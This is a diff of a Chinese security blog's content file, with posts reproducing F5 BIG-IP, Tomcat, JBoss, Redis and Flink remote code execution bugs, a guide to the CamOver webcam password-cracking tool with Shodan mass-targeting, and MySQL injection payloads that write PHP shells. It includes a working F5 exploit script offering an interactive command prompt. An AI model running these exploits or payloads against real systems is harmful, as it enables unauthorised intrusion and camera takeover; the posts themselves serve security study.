@@ -4,6 +4,7 @@
     <title>F5 BIG-IP 远程代码执行漏洞</title>
     <url>/2021/08/25/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
 <p>未授权的远程攻击者通过向漏洞页面发送特制的请求包，可以造成任意 Java 代码执行。进而控制 <code>F5 BIG-IP</code> 的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。该漏洞影响控制面板受影响，不影响数据面板。</p>
 <hr>
 <span id="more"></span>
@@ -60,13 +61,14 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import random</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line">import time</span><br><span class="line">import json</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">def title():</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mPOC_Des: 小拾玖的猫                                   \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mGithub : 小拾玖的猫                                \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34m公众号  : 小拾玖的猫                                                   \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mVersion: F5 BIG-IP                                                \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line"></span><br><span class="line">def POC_1(target_url):</span><br><span class="line">    vuln_url = target_url + &quot;/mgmt/tm/util/bash&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;Authorization&quot;: &quot;Basic YWRtaW46QVNhc1M=&quot;,</span><br><span class="line">        &quot;X-F5-Auth-Token&quot;: &quot;&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/json&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#x27;&#x27;&#x27;&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c &#x27;cat /etc/passwd&#x27;&quot;&#125;&#x27;&#x27;&#x27;</span><br><span class="line">    try:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)</span><br><span class="line">        if &#x27;root&#x27; in response.text and response.status_code == 200:</span><br><span class="line">            print(&quot;\033[32m[o] 目标 &#123;&#125;存在漏洞,响应为:&#123;&#125; \033[0m&quot;.format(target_url, json.loads(response.text)[&quot;commandResult&quot;]))</span><br><span class="line">            while True:</span><br><span class="line">                Cmd = str(input(&quot;\033[35mCmd &gt;&gt;&gt; \033[0m&quot;))</span><br><span class="line">                POC_2(target_url, Cmd)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;\033[31m[x] 目标 &#123;&#125;不存在漏洞 \033[0m&quot;.format(target_url))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 目标 &#123;&#125; 请求失败 \033[0m&quot;.format(target_url), e)</span><br><span class="line"></span><br><span class="line">def POC_2(target_url, Cmd):</span><br><span class="line">    vuln_url = target_url + &quot;/mgmt/tm/util/bash&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;Authorization&quot;: &quot;Basic YWRtaW46QVNhc1M=&quot;,</span><br><span class="line">        &quot;X-F5-Auth-Token&quot;: &quot;&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/json&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    Cmd = &quot;&#x27;&quot; + Cmd + &quot;&#x27;&quot;</span><br><span class="line">    data = &#x27;&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c %s&quot;&#125;&#x27; % Cmd</span><br><span class="line">    try:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)</span><br><span class="line">        print(&quot;\033[32m&#123;&#125; \033[0m&quot;.format(json.loads(response.text)[&quot;commandResult&quot;]))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 命令执行失败 \033[0m&quot;.format(target_url), e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    title()</span><br><span class="line">    target_url = str(input(&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;))</span><br><span class="line">    POC_1(target_url)</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>WEB-RCE</category>
+        <category>WEB安全</category>
       </categories>
   </entry>
   <entry>
     <title>Tomcat 任意上传漏洞(CVE-2017-12615)</title>
     <url>/2021/08/25/Tomcat%20%E4%BB%BB%E6%84%8F%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(CVE-2017-12615)/</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
 <p>2017年9月19日，Apache Tomcat官方确认并修复了两个高危漏洞，其中就有远程代码执行漏洞(CVE-2017-12615)。当 启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。</p>
 <hr>
 <span id="more"></span>
@@ -122,13 +124,14 @@
 
 ]]></content>
       <categories>
-        <category>WEB-RCE</category>
+        <category>WEB安全</category>
       </categories>
   </entry>
   <entry>
     <title>JBoss 4.x 反序列化漏洞(CVE-2017-7504)</title>
     <url>/2021/08/27/JBoss%204.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2017-7504)/</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
 <p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p>
 <hr>
 <span id="more"></span>
@@ -173,7 +176,7 @@
 <p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210827112510693.png" alt="image-20210827112510693"></p>
 ]]></content>
       <categories>
-        <category>WEB-RCE</category>
+        <category>WEB安全</category>
       </categories>
   </entry>
   <entry>
@@ -277,7 +280,7 @@
 <blockquote>
 <p>容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样</p>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps			<span class="comment">#查看所有启动的容器（若查看所有的容器包括已经关闭,添加-a参数即可）</span></span><br><span class="line">docker inspect ID	<span class="comment">#查看容器信息（数据卷等 -&gt; &quot;Mounts&quot;）</span></span><br><span class="line">docker stats ID		<span class="comment">#查看Docker状态</span></span><br><span class="line">docker logs ID		<span class="comment">#查看容器日志（报错和命令）</span></span><br><span class="line"></span><br><span class="line">docker run -it -d --name ubuntu_wintrysec -p 8088:80 ubuntu	</span><br><span class="line"><span class="comment">#运行Docker镜像</span></span><br><span class="line"><span class="comment">#-d	守护态运行，不直接把执行命令的结果输出在当前宿主机下</span></span><br><span class="line"><span class="comment">#--name参数为自定义容器名</span></span><br><span class="line"><span class="comment">#-p参数为指定端口映射、后者为容器的端口(我们访问Docker的宿主机8080端口)</span></span><br><span class="line"><span class="comment">#成功后台运行后会返回一个容器的id，只需要记住前两位即可</span></span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it ID bash	</span><br><span class="line"><span class="comment">#进入一个正在运行的容器的shell，容器id前4位就行,或者容器名也行</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>				<span class="comment">#退出容器</span></span><br><span class="line">docker stop ID		<span class="comment">#停止容器运行，写容器名也行，start是开启</span></span><br><span class="line">docker rm ID		<span class="comment">#删除容器</span></span><br><span class="line">docker rm `docker ps -a -q`		<span class="comment">#删除所有已经关闭的容器，-f能把正在运行的也关闭</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps			<span class="comment">#查看所有启动的容器（若查看所有的容器包括已经关闭,添加-a参数即可）</span></span><br><span class="line">docker inspect ID	<span class="comment">#查看容器信息（数据卷等 -&gt; &quot;Mounts&quot;）</span></span><br><span class="line">docker stats ID		<span class="comment">#查看Docker状态</span></span><br><span class="line">docker logs ID		<span class="comment">#查看容器日志（报错和命令）</span></span><br><span class="line"></span><br><span class="line">docker run -it -d --name ubuntu_wintrysec -p 8088:80 ubuntu	</span><br><span class="line"><span class="comment">#运行Docker镜像</span></span><br><span class="line"><span class="comment">#-d	守护态运行，不直接把执行命令的结果输出在当前宿主机下</span></span><br><span class="line"><span class="comment">#--name参数为自定义容器名</span></span><br><span class="line"><span class="comment">#-p参数为指定端口映射、后者为容器的端口(我们访问Docker的宿主机8080端口)</span></span><br><span class="line"><span class="comment">#成功后台运行后会返回一个容器的id，只需要记住前两位即可</span></span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it ID bash	</span><br><span class="line"><span class="comment">#进入一个正在运行的容器的shell，容器id前4位就行,或者容器名也行</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>				<span class="comment">#退出容器</span></span><br><span class="line">docker stop ID		<span class="comment">#停止容器运行，写容器名也行，start是开启</span></span><br><span class="line">docker rm ID		<span class="comment">#删除容器</span></span><br><span class="line">docker rm `docker ps -a -q`		<span class="comment">#删除所有已经关闭的容器，-f能把正在运行的也关闭</span></span><br><span class="line"></span><br><span class="line">docker stop `docker ps -aq`    <span class="comment">#停止所有容器</span></span><br><span class="line">docker rm `docker ps -aq`      <span class="comment">#删除所有容器</span></span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -288,6 +291,7 @@
     <title>Redis(&lt;= 5.0.5)主从复制 RCE</title>
     <url>/2021/08/29/Redis(=%205.0.5)%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%20RCE/</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
 <p>在2019年7月7日结束的WCTF2019 Final上，LC/BC的成员Pavel Toporkov在分享会上介绍了一种关于redis新版本的RCE利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大。</p>
 <ul>
 <li>详情参考：<a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">Pavel Toporkov</a></li>
@@ -325,7 +329,7 @@
 <p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829154332910.png" alt="image-20210829154332910"></p>
 ]]></content>
       <categories>
-        <category>WEB-RCE</category>
+        <category>WEB安全</category>
       </categories>
   </entry>
   <entry>
@@ -356,21 +360,21 @@
 <p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829121549668.png" alt="image-20210829121549668"></p>
 ]]></content>
       <categories>
-        <category>WEB-RCE</category>
+        <category>WEB安全</category>
       </categories>
   </entry>
   <entry>
     <title>成都CCS网络安全大会</title>
     <url>/2021/10/27/%E6%88%90%E9%83%BDCCS%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E4%BC%9A/</url>
     <content><![CDATA[<hr>
-<p>秋风起，暑却未消停。蓉城的苍穹依旧云卷天舒，秋却不是四年前的秋，我记忆里的秋应该是有雨的，凉气逼得外出的人们不得不多加几件外套。今年的秋暑意未曾停歇，火红的骄阳不舍这似水的流年。是啊，时间已悄然走过了四年，一经辗转便奔向第五个年头。</p>
+<p>秋风起，暑却未消停。蓉城的苍穹依旧云卷天舒，秋却不是四年前的秋，我记忆里的秋应该是有雨的，凉气逼得外出的人们不得不多加几件外套。今年的秋，暑意未曾停歇，火红的骄阳不舍这似水的流年。是啊，时间已悄然走过了四年，一经辗转便奔向第五个年头。</p>
 <p>我单不知，人在一段不长也不短的时间里，可以经历无数次的选择，在每一个不起眼的日子里作出的每一个不起眼的决定，竟能发生在未来！舍弃文笔从业网安或许并非我意，也未曾作出从蓉城奔赴鹭岛的选择，我没有过抉择，却得到了答案。</p>
 <p>于是，我在时间的海岸线上拾起了回忆的贝壳：也许是在学校的某一个不起眼的夜晚，教室里坐着有三两个同学，异口同声的说：“打进CTF线下大赛！成为远近闻名的黑客！”；也许是在每一个不起眼的课堂，老师在台上对着台下疯狂输出的同时，我在台下开着电脑冲刷着CTF的赛题……</p>
 <p>彼时的我，走在蓉城的某个街头角落，踏行在眼前的路上；此时的我，站在鹭岛的码头上，看着眼前浪花地拍打。我仿佛见到了以前的自己，那个不是很努力，却又不肯轻易言弃、熟悉又陌生的身影……</p>
 <hr>
-<h1 id="打击黑灰产网络犯罪论坛"><a href="#打击黑灰产网络犯罪论坛" class="headerlink" title="打击黑灰产网络犯罪论坛"></a>打击黑灰产网络犯罪论坛</h1><p><strong>标签：黑灰产、网络诈骗、大数据分析、自动化流程处置</strong></p>
 <span id="more"></span>
 
+<h1 id="打击黑灰产网络犯罪论坛"><a href="#打击黑灰产网络犯罪论坛" class="headerlink" title="打击黑灰产网络犯罪论坛"></a>打击黑灰产网络犯罪论坛</h1><p><strong>标签：黑灰产、网络诈骗、大数据分析、自动化流程处置</strong></p>
 <h2 id="打击黑灰产"><a href="#打击黑灰产" class="headerlink" title="打击黑灰产"></a>打击黑灰产</h2><h3 id="全网采集（建立样本库）"><a href="#全网采集（建立样本库）" class="headerlink" title="全网采集（建立样本库）"></a>全网采集（建立样本库）</h3><ul>
 <li>公开情报（<a href="https://www.virustotal.com/gui/home/upload%EF%BC%89">https://www.virustotal.com/gui/home/upload）</a></li>
 <li>网络巡检</li>
@@ -489,6 +493,7 @@
     <title>Arpspoof安装与使用</title>
     <url>/2021/10/29/Arpspoof%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
 <p>Arpspoof是dsniff的一个组件，主要用于进行arp欺骗使用。</p>
 <ul>
 <li>Driftnet官网：<a href="http://www.ex-parrot.com/~chris/driftnet/">http://www.ex-parrot.com/~chris/driftnet/</a></li>
@@ -539,6 +544,7 @@
     <title>Apache Flink任意Jar包上传RCE</title>
     <url>/2021/10/29/Apache%20Flink%E4%BB%BB%E6%84%8FJar%E5%8C%85%E4%B8%8A%E4%BC%A0RCE/</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
 <p>Apache Flink是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。Flink以数据并行和流水线方式执行任意流数据程序，Flink的流水线运行时系统可以执行批处理和流处理程序。</p>
 <p>有安全研究员公开了一个Apache Flink的任意Jar包上传导致远程代码执行的漏洞。攻击者只需要自己定制一个恶意jar上传，即可达到攻击目的。</p>
 <hr>
@@ -576,13 +582,14 @@
 <p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210809094810139.png" alt="image-20210809094810139"></p>
 ]]></content>
       <categories>
-        <category>WEB-RCE</category>
+        <category>WEB安全</category>
       </categories>
   </entry>
   <entry>
     <title>Sysmon安装与使用</title>
     <url>/2021/10/29/Sysmon%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><hr>
+<p>编写“Threat Hunt系列”的指导文章主要原因是，安全研究人员在编写渗透测试文章后并没有提供检测技术。渗透测试人员虽然完成了很多出色的工作、描述了对手所使用的工具和技术，但是只有少数人愿意共享出用于检测他们所使用的工具或者编写的代码。</p>
 <p>系统监视器（Sysmon）是Windows系统服务和设备驱动程序。应用打开或任何进程创建行为发生时，Sysmon 会使用 sha1（默认），MD5，SHA256 或 IMPHASH 记录进程镜像文件的 hash 值，包含进程创建过程中的进程 GUID，每个事件中包含 session 的 GUID。除此之外记录磁盘和卷的读取请求 / 网络连接（包括每个连接的源进程，IP 地址，端口号，主机名和端口名），重要的是还可在生成初期进程事件能记录在复杂的内核模式运行的恶意软件。</p>
 <hr>
 <span id="more"></span>
@@ -604,7 +611,610 @@
 <p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/34.png" alt="34"></p>
 ]]></content>
       <categories>
-        <category>主机安全</category>
+        <category>Threat Hunt</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>CamOver安装与使用</title>
+    <url>/2021/10/30/CamOver%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全研究为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
+<p>CamOver 是一款功能强大的摄像头漏洞利用工具，在该工具的帮助下，广大研究人员可以轻松破解网络摄像头的管理员密码，并且能与<a href="https://www.shodan.io/">shodan</a>网络设备搜索引擎配合利用。</p>
+<ul>
+<li>项目地址：<a href="https://github.com/EntySec/CamOver">https://github.com/EntySec/CamOver</a></li>
+</ul>
+<hr>
+<span id="more"></span>
+
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Linux安装CamOver"><a href="#Linux安装CamOver" class="headerlink" title="Linux安装CamOver"></a>Linux安装CamOver</h3><p>由于 CamOver 使用 Python3 开发，因此首先需要在本地设备上安装并配置好 Python3 环境。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install git+https://github.com/EntySec/CamOver</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211029193739833.png" alt="image-20211029193739833"></p>
+<h3 id="功能特性"><a href="#功能特性" class="headerlink" title="功能特性"></a>功能特性</h3><ul>
+<li>该工具能够发现并利用大多数主流型号网络摄像头中的安全漏洞，例如 CCTV、GoAhead 和 Netwave 等。</li>
+<li>经过优化，支持多线程同时攻击多个摄像头。</li>
+<li>简单的命令行接口和 API 用法。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># camover</span></span><br><span class="line">usage: camover [-h] [-t] [-o OUTPUT] [-i INPUT] [-a ADDRESS] [--shodan SHODAN] [--zoomeye ZOOMEYE] [-p PAGES]</span><br><span class="line"></span><br><span class="line">CamOver is a camera exploitation tool that allows to disclosure network camera admin password.</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -t, --threads         Use threads <span class="keyword">for</span> fastest work.</span><br><span class="line">  -o OUTPUT, --output OUTPUT</span><br><span class="line">                        Output result to file.</span><br><span class="line">  -i INPUT, --input INPUT</span><br><span class="line">                        Input file of addresses.</span><br><span class="line">  -a ADDRESS, --address ADDRESS</span><br><span class="line">                        Single address.</span><br><span class="line">  --shodan SHODAN       Shodan API key <span class="keyword">for</span> exploiting devices over Internet.</span><br><span class="line">  --zoomeye ZOOMEYE     ZoomEye API key <span class="keyword">for</span> exploiting devices over Internet.</span><br><span class="line">  -p PAGES, --pages PAGES</span><br><span class="line">                        Number of pages you want to get from ZoomEye.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Shodan的基本使用"><a href="#Shodan的基本使用" class="headerlink" title="Shodan的基本使用"></a>Shodan的基本使用</h3><p>官网：<a href="https://www.shodan.io/">shodan</a>，Shodan一些常用的语法；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostname：搜索指定的主机或域名。例如，hostname:&quot;google&quot;</span><br><span class="line"></span><br><span class="line">port：搜索指定的端口或服务。例如， port:&quot;21&quot;</span><br><span class="line"></span><br><span class="line">country：搜索指定的国家。例如， country:&quot;CN&quot;</span><br><span class="line"></span><br><span class="line">city：搜索指定的城市。例如，city:&quot;Hefei&quot;</span><br><span class="line"></span><br><span class="line">org：搜索指定的组织或公司。例如，org:&quot;google&quot;</span><br><span class="line"></span><br><span class="line">isp：搜索指定的ISP供应商。例如， isp:&quot;China Telecom&quot;</span><br><span class="line"></span><br><span class="line">product：搜索指定的操作系统/软件/平台。例如， product:&quot;Apache httpd&quot;</span><br><span class="line"></span><br><span class="line">version：搜索指定的软件版本。例如， version:&quot;1.6.2&quot;</span><br><span class="line"></span><br><span class="line">geo：搜索指定的地理位置，参数为经纬度。例如， geo:&quot;31.8639,117.2808&quot;</span><br><span class="line"></span><br><span class="line">before/after：搜索指定收录时间前后的数据，格式为 dd-mm-yy。例如， before:&quot;11-09-19&quot;</span><br><span class="line"></span><br><span class="line">net：搜索指定的IP地址或子网。例如，net:&quot;210.45.240.0/24&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Shodan搜索例子"><a href="#Shodan搜索例子" class="headerlink" title="Shodan搜索例子"></a>Shodan搜索例子</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、查找位于合肥的Apache服务器</span><br><span class="line">apache city:&quot;Hefei&quot;</span><br><span class="line"></span><br><span class="line">2、查找位于国内的Nginx服务器</span><br><span class="line">nginx country:&quot;CN&quot;</span><br><span class="line"> </span><br><span class="line">3、查找GWS（Gogle Web Server）服务器</span><br><span class="line">server: gws hostname:&quot;google&quot;</span><br><span class="line"></span><br><span class="line">4、查找指定网段华为设备</span><br><span class="line">huawei net:&quot;64.191.146.0/24&quot;</span><br><span class="line"></span><br><span class="line">5、查找网络摄像头</span><br><span class="line">webcam</span><br><span class="line"></span><br><span class="line">6、查找国内的海康威视网络摄像头</span><br><span class="line">Server: Hikvision-Webs country:&quot;CN&quot;</span><br><span class="line"></span><br><span class="line">7、查找SQ-WEBCAM摄像头</span><br><span class="line">Server: SQ-WEBCAM</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><strong>1.攻击单个摄像头;</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">camover -a xxx.xxx.xxx.xxx:port</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.通过网络攻击远程摄像头;</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">camover -t --shodan PSKINdQe1GyxGgecYz2191H2JoS9qvgD</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211029200703875.png" alt="image-20211029200703875"></p>
+<p>使用浏览器访问；</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211029200745747.png" alt="image-20211029200745747"></p>
+<p><strong>3.从输入文件获取目标摄像头；</strong></p>
+<p>还可以使用开放数据库中提供的摄像头地址，使用 <code>-t</code> 参数来设置多线程数量以获得更好的性能：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">camover -t -i cameras.txt -o passwords.txt</span><br></pre></td></tr></table></figure>
+
+<p>此命令将会攻击 cameras.txt 中给出的所有摄像头，并会将所有获取到的密码存储至 passwords.txt 文件中。</p>
+<p><strong>4.API的调用</strong></p>
+<p>CamOver 还提供了自己的 <strong>Python API</strong>，可以将其导入至你们自己的项目代码中并调用其功能：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> camover <span class="keyword">import</span> CamOver</span><br></pre></td></tr></table></figure>
+
+<p>调用样例，攻击单个摄像头：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> camover <span class="keyword">import</span> CamOver</span><br><span class="line"></span><br><span class="line">camover = CamOver()</span><br><span class="line">creds = camover.exploit(<span class="string">&#x27;xxx.xxx.xxx.xxx:port&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(creds)</span><br><span class="line"><span class="comment"># 输出: (&#x27;admin&#x27;, &#x27;gzmudzka&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>黑客工具</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>MySQL写shell的利用</title>
+    <url>/2021/11/01/MySQL%E5%86%99shell%E7%9A%84%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
+<p>关于MySQL写shell的方法网上基本很多了，我也在此总结下。众所周知，web渗透的成功很多是需要前置条件的，比如中间件的配置不当、账户权限的混淆等等，这些看起来或许只是为增强用户体验感而设计的功能，在安全研究人员的面前就变味了……</p>
+<hr>
+<span id="more"></span>
+
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
+<p>全版本？</p>
+<hr>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ol>
+<li>Windows 7</li>
+<li>点击下载<a href="https://www.xp.cn/download.html">phpStudy</a>，安装并启动；</li>
+</ol>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101110402178.png" alt="image-20211101110402178"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="MySQL权限的获取"><a href="#MySQL权限的获取" class="headerlink" title="MySQL权限的获取"></a>MySQL权限的获取</h3><p>拿到 MySQL 的用户名和密码的方式多种多样：</p>
+<ol>
+<li>MySQL 3306 端口弱口令爆破</li>
+<li>sqlmap 注入的 <code>--sql-shell</code> 模式</li>
+<li>网站的数据库配置文件中拿到明文密码信息</li>
+<li>CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限</li>
+</ol>
+<h3 id="MySQL-shell的写入条件"><a href="#MySQL-shell的写入条件" class="headerlink" title="MySQL shell的写入条件"></a>MySQL shell的写入条件</h3><ol>
+<li>数据库当前用户为root权限；</li>
+<li>知道当前网站的绝对路径；</li>
+<li><code>PHP</code>的<code>GPC</code>为 off状态；(魔术引号，GET，POST，Cookie)</li>
+<li>写入shell的路径存在写入权限；</li>
+<li><code>secure_file_priv</code> 无限制。</li>
+</ol>
+<h3 id="outfile和dumpfile写shell"><a href="#outfile和dumpfile写shell" class="headerlink" title="outfile和dumpfile写shell"></a>outfile和dumpfile写shell</h3><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p><strong><code>outfile</code>和<code>dumpfile</code>的区别：</strong></p>
+<p><code>outfile</code>:</p>
+<ol>
+<li>支持多行数据同时导出；</li>
+<li>使用union联合查询时，要保证两侧查询的列数相同；</li>
+<li>会在换行符制表符后面追加反斜杠；</li>
+<li>会在末尾追加换行。</li>
+</ol>
+<p><code>dumpfile</code>:</p>
+<ol>
+<li>每次只能导出一行数据；</li>
+<li>不会在换行符制表符后面追加反斜杠；</li>
+<li>不会在末尾追加换行。</li>
+</ol>
+<p><strong>基于UNION联合查询</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 UNION ALL SELECT 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into outfile &#x27;C:\info.php&#x27;%23</span><br><span class="line">?id=1 UNION ALL SELECT 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into dumpfile &#x27;C:\info.php&#x27;%23</span><br></pre></td></tr></table></figure>
+
+<p><strong>非联合查询</strong></p>
+<p>当无法使用<code>UNION联合查询</code>时，可以使用<code>fields terminated by</code>与<code>lines terminated by</code>来写shell</p>
